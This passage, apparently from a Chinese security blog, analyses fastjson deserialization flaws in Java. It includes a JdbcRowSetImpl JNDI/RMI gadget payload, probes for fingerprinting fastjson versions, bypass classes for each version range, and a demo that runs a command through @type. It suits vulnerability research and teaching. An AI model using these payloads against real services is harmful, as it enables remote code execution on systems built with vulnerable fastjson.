t;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;localhost:1099&#x2F;Exploit&quot;, &quot;autoCommit&quot;:true&#125;&#125;
判断目标fastjson版本1.判断是否是其他json 原理：jackson不允许存在不相关的键值，fastjson则是允许的 如原json如下。 &#123;&quot;pageNumber&quot;:1,&quot;pageSize&quot;:1&#125;
加上一个不相关的键值 &#123;&quot;pageNumber&quot;:1,&quot;pageSize&quot;:1,&quot;test&quot;:1&#125;
jackson就会报错，fastjson则不会，而是和之前一模一样。 如果对方什么都不回显，那就只能dnslog或者时间延迟了。 2.通过报错消息 &#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;a[&quot;test&quot;:1]
3.无报错信息，判断版本区间 先简单总结一下fastjson的可利用版本。 &lt;1.2.24，没有任何限制。 1.2.24-1.2.47，java.lang.Class绕过。 1.2.48-1.2.68，java.lang.AutoCloseable绕过。 1.2.70-1.2.72，无链版本 1.2.73-1.2.80，java.lang.Exception绕过。 1.2.83，无漏洞版本 参考https://tttang.com/archive/1579/#toc__2 https://www.bilibili.com/video/BV1bD4y117Qh/ https://www.cnblogs.com/nice0e3/p/14601670.html https://www.anquanke.com/post/id/240446#h3-6 https://javasec.org/java-vuls/FastJson.html 盲判断目标的fastjson版本：https://mp.weixin.qq.com/s/jbkN86qq9JxkGNOhwv9nxA fastjson反序列化漏洞区分版本号的方法总结：https://blog.csdn.net/m0_71692682/article/details/125814861 fastjson 获取精确版本号的方法：https://b1ue.cn/archives/402.html

两个特性用户可控制反序列化的对象user类如下： package org.example;public class user &#123; private String name; private int age; private String hobby; public user() &#123; System.out.println(&quot;user构造函数user(无参数)&quot;); &#125; public user(String name, int age, String hobby) &#123; System.out.println(&quot;user构造函数user(有参数)&quot;); this.name = name; this.age = age; this.hobby = hobby; &#125; public String getName() &#123; System.out.println(&quot;user调用了getName&quot;); return name; &#125; public void setName(String name) &#123; System.out.println(&quot;user调用了setName&quot;); this.name = name; &#125; public int getAge() &#123; System.out.println(&quot;user调用了getAge&quot;); return age; &#125; public void setAge(int age) &#123; System.out.println(&quot;user调用了setAge&quot;); this.age = age; &#125; public String getHobby() &#123; System.out.println(&quot;user调用了getHobby&quot;); return hobby; &#125; public void setHobby(String hobby) &#123; System.out.println(&quot;user调用了setHobby&quot;); this.hobby = hobby; &#125; @Override public String toString() &#123; return &quot;user&#123;&quot; + &quot;name=&#x27;&quot; + name + &#x27;\&#x27;&#x27; + &quot;, age=&quot; + age + &quot;, hobby=&#x27;&quot; + hobby + &#x27;\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125;&#125;
然后是调用函数,我都是写在各种小test里，然后在main中调用 package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.serializer.SerializerFeature;public class Main &#123; public static void main(String[] args) &#123; //test1(); //test2(); test3(); //test4(); &#125;&#125;
安全的使用方法：先看正确的使用方法: public static void test3()&#123;// 安全的写法 String p1 = &quot;&#123;\&quot;age\&quot;:18,\&quot;hobby\&quot;:\&quot;gaming\&quot;,\&quot;name\&quot;:\&quot;y\&quot;&#125;&quot;; user tmpuser = JSON.parseObject(p1, user.class); //限制死了反序列化的类型为user System.out.println(tmpuser.getAge()); &#125;
可以看到输出中，出现了 user构造函数user(无参数) 这是因为需要构造user对象tmpuser。 user调用了setAge user调用了setHobby user调用了setName 这三个出现，是因为在构造过程中，给age，name，hobby这三个属性赋值了。 user调用了getAg 18 是tmpuser.getAge()这一行输出的。 限制死了反序列化的类型为user，这种由开发者控制的反序列化的类型，是安全的。 不安全的使用方法：因为fastjson有一个特性，可以由用户指定反序列化的类型，通过@type字段。可以先设置另一个user2对象 代码如下 package org.example;public class user2 &#123; private String name; private int age; private String hobby; public user2() &#123; System.out.println(&quot;user2构造函数user2(无参数)&quot;); &#125; public user2(String name, int age, String hobby) &#123; System.out.println(&quot;user2构造函数user2(有参数)&quot;); this.name = name; this.age = age; this.hobby = hobby; &#125; public String getName() &#123; System.out.println(&quot;user2调用了getName&quot;); return name; &#125; public void setName(String name) &#123; System.out.println(&quot;user2调用了setName&quot;); this.name = name; &#125; public int getAge() &#123; System.out.println(&quot;user2调用了getAge&quot;); return age; &#125; public void setAge(int age) &#123; System.out.println(&quot;user2调用了setAge&quot;); this.age = age; &#125; public String getHobby() &#123; System.out.println(&quot;user2调用了getHobby&quot;); return hobby; &#125; public void setHobby(String hobby) &#123; System.out.println(&quot;user2调用了setHobby&quot;); this.hobby = hobby; &#125; @Override public String toString() &#123; return &quot;user&#123;&quot; + &quot;name=&#x27;&quot; + name + &#x27;\&#x27;&#x27; + &quot;, age=&quot; + age + &quot;, hobby=&#x27;&quot; + hobby + &#x27;\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125;&#125;
然后是调用代码： public static void test4() &#123; String p1 = &quot;&#123;\&quot;@type\&quot;:\&quot;org.example.user\&quot;,\&quot;age\&quot;:18,\&quot;hobby\&quot;:\&quot;gaming\&quot;,\&quot;name\&quot;:\&quot;y\&quot;&#125;&quot;; String p2 = &quot;&#123;\&quot;@type\&quot;:\&quot;org.example.user2\&quot;,\&quot;age\&quot;:18,\&quot;hobby\&quot;:\&quot;gaming\&quot;,\&quot;name\&quot;:\&quot;y\&quot;&#125;&quot;; System.out.println(&quot;JSON.parse(p1):&quot;); Object P1 = JSON.parse(p1); System.out.println(&quot;JSON.parse(p2):&quot;); Object P2 = JSON.parse(p2);&#125;
输出结果如下：
可以将test()理解为一个函数，用户输入序列化后的字符串交给服务器，服务器对字符串进行反序列化，这里输入的p1,p2就可以理解为调用了两次函数。 调用getName方法但反序列化字符串的函数不是parse而是parseObject时，就会调用对象中的getter类方法，比如getName，getAge,getHobby。 public static void test6() &#123; String p1 = &quot;&#123;\&quot;@type\&quot;:\&quot;org.example.user\&quot;,\&quot;age\&quot;:18,\&quot;hobby\&quot;:\&quot;gaming\&quot;,\&quot;name\&quot;:\&quot;y\&quot;&#125;&quot;; System.out.println(&quot;JSON.parse(p1):&quot;); Object P1 = JSON.parse(p1); System.out.println(&quot;JSON.parseObject(p1):&quot;); Object P2 = JSON.parseObject(p1); &#125;
在了解这两种机制后，就可能会出现下面这种情况：代码中出现了 JSON.parseObject(p1); 可能设计初衷只是想解析反序列化”{&quot;age&quot;:18,&quot;hobby&quot;:&quot;gaming&quot;,&quot;name&quot;:&quot;y&quot;}”这样的字符串，但是因为这两个特性，就可能出现一些意想不到的结果 调用流程分析先来捋顺正常的调用，再来看漏洞的调用 正常流程识别@type使用如下代码， public static void test7()&#123; String p1 = &quot;&#123;\&quot;@type\&quot;:\&quot;org.example.user\&quot;,\&quot;age\&quot;:18,\&quot;hobby\&quot;:\&quot;gaming\&quot;,\&quot;name\&quot;:\&quot;y\&quot;&#125;&quot;; System.out.println(&quot;JSON.parseObject(p1):&quot;); Object P2 = JSON.parseObject(p1);&#125;
断点下载 Object P2 = JSON.parseObject(p1); 前面都是普通的调来调去，一直到这里 public Object parse(Object fieldName) &#123; final JSONLexer lexer = this.lexer; switch (lexer.token()) &#123;………… ………… case LBRACE: JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField)); return parseObject(object, fieldName); ………… …………
这里的lexer是由之前JSON.java中的 DefaultJSONParser parser = new DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features); 这一行定义和赋值 在swtich中，识别到第一个字符串是&#123; (也就是 LBRACE )后，通过 return parseObject(object, fieldName); 进入到了parseObject函数中，这个函数还是在当前DefaultJSONParser.java文件中
经过几个判断后，进入到try finally 代码块中，这里面是一个for(;;)死循环，然后可以看到有一个判断 if (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123; String typeName = lexer.scanSymbol(symbolTable, &#x27;&quot;&#x27;); Class&lt;?&gt; clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader()); if (clazz == null) &#123; object.put(JSON.DEFAULT_TYPE_KEY, typeName); continue; &#125; ……………… ………………
JSON.DEFAULT_TYPE_KEY是@type lexer.isEnabled()会返回入参的mask字段，这边的Feature.DisableSpecialKeyDetect内容如下，所以!lexer.isEnabled(Feature.DisableSpecialKeyDetect)的结果为true
随后就获取到@type的value：org.example.user 这边的意思大概就是，通过识别到&#123;开头，然后开始进行反序列化的字符从识别，识别到@type，意味着需要指定类进行java反序列化。这边的下一行 Class&lt;?&gt; clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader()); 就是加载制定的类以便于反序列化 加载指定类在上面用loadlass加载完类后，继续这个if代码块，在最下面有一个 ObjectDeserializer deserializer = config.getDeserializer(clazz);return deserializer.deserialze(this, clazz, fieldName);
这边是为了获取反序列化器deserializer，跟进getDeserializer，因为type instanceof Class&lt;?&gt;，跳到 getDeserializer((Class&lt;?&gt;) type, type)中， 在这个getDeserializer，会经过一些替换处理，if判断，比如说会把$换成.
className = className.replace(‘$’, ‘.’);
会检测是否java.awt.开头等等。 最后因为传入的value是org.example.user，流程会来到461行的 derializer = createJavaBeanDeserializer(clazz, type);
跟进createJavaBeanDeserializer(),这个函数里的判断主要是围绕 asmEnable 变量的true和false来进行的，在一系列的处理后，来到了 JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);
跟进这个build()函数，这函数内容也非常多，不过因为两个长的 if 代码块不会运行，所以可以忽略，重点是下面的三个 for 代码块，
其中第一个循环 for (Method method : methods) 是在指定的java类中找setter类方法。那些“函数命名以set开头，第四个字母大写”之类的条件，就是在这里进行判断处理的。
String methodName = method.getName();if (methodName.length() &lt; 4) &#123; //方法名长度大于4 continue;&#125;if (Modifier.isStatic(method.getModifiers())) &#123; //非静态方法 continue;&#125;// support builder setif (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) &#123; continue;&#125;Class&lt;?&gt;[] types = method.getParameterTypes();if (types.length != 1) &#123; continue;&#125;JSONField annotation = method.getAnnotation(JSONField.class);if (annotation == null) &#123; annotation = TypeUtils.getSuperMethodAnnotation(clazz, method);&#125;if (annotation != null) &#123; if (!annotation.deserialize()) &#123; continue; &#125; ordinal = annotation.ordinal(); serialzeFeatures = SerializerFeature.of(annotation.serialzeFeatures()); parserFeatures = Feature.of(annotation.parseFeatures()); if (annotation.name().length() != 0) &#123; String propertyName = annotation.name(); add(fieldList, new FieldInfo(propertyName, method, null, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, null, null)); continue; &#125;&#125;if (!methodName.startsWith(&quot;set&quot;)) &#123; // TODO &quot;set&quot;的判断放在 JSONField 注解后面，意思是允许非 setter 方法标记 JSONField 注解？ continue;&#125;char c3 = methodName.charAt(3);String propertyName;if (Character.isUpperCase(c3) // || c3 &gt; 512 // for unicode method name) &#123; if (TypeUtils.compatibleWithJavaBean) &#123; propertyName = TypeUtils.decapitalize(methodName.substring(3)); &#125; else &#123; propertyName = Character.toLowerCase(methodName.charAt(3)) + methodName.substring(4); &#125;&#125; else if (c3 == &#x27;_&#x27;) &#123; propertyName = methodName.substring(4);&#125; else if (c3 == &#x27;f&#x27;) &#123; propertyName = methodName.substring(3);&#125; else if (methodName.length() &gt;= 5 &amp;&amp; Character.isUpperCase(methodName.charAt(4))) &#123; propertyName = TypeUtils.decapitalize(methodName.substring(3));&#125; else &#123; continue;&#125;
在处理的最后，会使用add()将找到的方法加进fieldList中，（add中的FieldInfo，会涉及到下面的getonly参数） add(fieldList, new FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, fieldAnnotation, null));
第二个for (Field field : clazz.getFields())是遍历所有public的方法， 第三个与第一个类似，不过是getter方法 getonly参数在构造函数FieldInfo()中，有一个东西需要注意，getonly参数，如果getonly参数为false，会导致在return deserializer.deserialze(this, clazz, fieldName);内的调试出现问题，没办法跟踪代码，（具体是为啥不是很清楚，以后可以研究一下），需要让getonly参数为true，主要代码在FieldInfo.java中下面的代码。有两个条件，
第一是代码要在走到这个FieldInfo.java中，这里需要从JavaBeanInfo.java中的add(fieldList, new FieldInfo(propertyName, method, null, clazz, type, 0, 0, 0, annotation, null, null));进去， 第二个是这里的第二个if ((types = method.getParameterTypes()).length == 1)
为了后续方便调试，这个参数需要为true，在FieldInfo()中，这个参数为true，需要 method.getParameterTypes()的长度不为1， if ((types = method.getParameterTypes()).length == 1)
然而在第一个for (Method method : methods) 循环中，有这样一个判断 Class&lt;?&gt;[] types = method.getParameterTypes();if (types.length != 1) &#123; continue;&#125;
所以在第一个for循环中，是永远不能使getonly为true的。因为如果参数不为1,那就会被continue，代码根本走不到add()；如果参数为1,代码在走到了add(),那getonly就只能为false了。 所以需要看第二个for循环。 第二个for循环是找getter函数，构造的函数需要满足以下几个条件 // 函数名大于4if (methodName.length() &lt; 4) &#123; continue;&#125;// 函数不能是静态方法 staticif (Modifier.isStatic(method.getModifiers())) &#123; continue;&#125;// 函数需要以get开头，且第四个字符是大写if (methodName.startsWith(&quot;get&quot;) &amp;&amp; Character.isUpperCase(methodName.charAt(3))) &#123; //函数不能有入参 if (method.getParameterTypes().length != 0) &#123; continue; &#125;// 函数返回值需要是以下几种类型 Collection,Map,AtomicBoolean,AtomicInteger,AtomicLongif (Collection.class.isAssignableFrom(method.getReturnType()) // || Map.class.isAssignableFrom(method.getReturnType()) // || AtomicBoolean.class == method.getReturnType() // || AtomicInteger.class == method.getReturnType() // || AtomicLong.class == method.getReturnType() //) &#123; …………// fieldList中没有setter方法，简单说就是，如果getKey要满足条件，就不能出现满足条件的setKey FieldInfo fieldInfo = getField(fieldList, propertyName); if (fieldInfo != null) &#123; continue; &#125; ………… add(fieldList, new FieldInfo(propertyName, method, null, clazz, type, 0, 0, 0, annotation, null, null)); …………&#125;
所以为了将getonly变量为true，所需要构造的getter函数就可以简单写为 public AtomicBoolean getKey2()&#123;// Collection&lt;String&gt; re = null;// Map&lt;String,String&gt; re = null; AtomicBoolean re = null;// AtomicInteger re = null;// AtomicLong re = null; System.out.println(&quot;user调用了setKey2&quot;); this.key1 = key1; this.key2 = key2; return re; &#125;
之后，代码跳出JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy); 向下走到 for (FieldInfo fieldInfo : beanInfo.fields) &#123; if (fieldInfo.getOnly) &#123; asmEnable = false; break; &#125; …………&#125;…………if (!asmEnable) &#123; return new JavaBeanDeserializer(this, clazz, type);&#125;
然后就可以将asmEnable设置为false，随后 return new JavaBeanDeserializer(this, clazz, type); 结束函数。 在return的时候，是new了一个新的JavaBeanDeserializer，所以还会在走一边之前的三个for循环那块的流程，然后退出到ParseConfig.java的derializer = createJavaBeanDeserializer(clazz, type);，再继续退出当前的getDeserializer()函数，回到getDeserializer()，最后退出到DefaultJSONParser.java的 ObjectDeserializer deserializer = config.getDeserializer(clazz);return deserializer.deserialze(this, clazz, fieldName);
反序列化通过调整getter函数，使用ObjectDeserializer deserializer = config.getDeserializer(clazz);获取到反序列化器后 退出到DefaultJSONParser.java的return deserializer.deserialze(this, clazz, fieldName);后， 跟进deserialze()方法，跳过一些重载方法后，来到JavaBeanDeserializer.java文件中。走到object = createInstance(parser, type);时。这里是新建一个实例，在这里面有一句object = constructor.newInstance();会执行指定了类的构造方法
之后在fieldDeser.setValue(object, fieldValue);中跟进，里面在经过层层if判断和其他的处理后，有一行反射代码method.invoke(object, value); 在这执行了之前加入到fieldList的setter函数， 这里是setName
而被执行的getter方法，是在JSON.java的return (JSONObject) JSON.toJSON(obj);中被调用的，在使用parse()将字符串反序列化为对象后，判断对象类型是否是JSON，如果不是，就再使用toJSON()函数处理一下obj。
在toJSON中，通过ObjectSerializer serializer = config.getObjectWriter(clazz);获取ObjectSerializer：
在获取到ObjectSerializer后，在Map&lt;String, Object&gt; values = javaBeanSerializer.getFieldValuesMap(javaObject);里面执行的getter方法，具体来看： getFieldValuesMap() –&gt; getter.getPropertyValue(object) -&gt; Object propertyValue = fieldInfo.get(object);
public Object get(Object javaObject) throws IllegalAccessException, InvocationTargetException &#123; if (method != null) &#123; Object value = method.invoke(javaObject, new Object[0]); return value; &#125;
测试执行命令假如说在代码中有一个这样的类 package org.example;import java.io.IOException;public class testcmd &#123; public void setCmd(String cmd) throws IOException &#123; Runtime.getRuntime().exec(cmd); &#125;&#125;
如果想要通过fastjson执行命令，可以这样写 public static void test7()&#123; String cmd &#x3D; &quot;&#123;\&quot;@type\&quot;:\&quot;org.example.testcmd\&quot;,\&quot;cmd\&quot;:\&quot;gnome-calculator\&quot;&#125;&quot;; Object P2 &#x3D; JSON.parseObject(cmd);&#125;
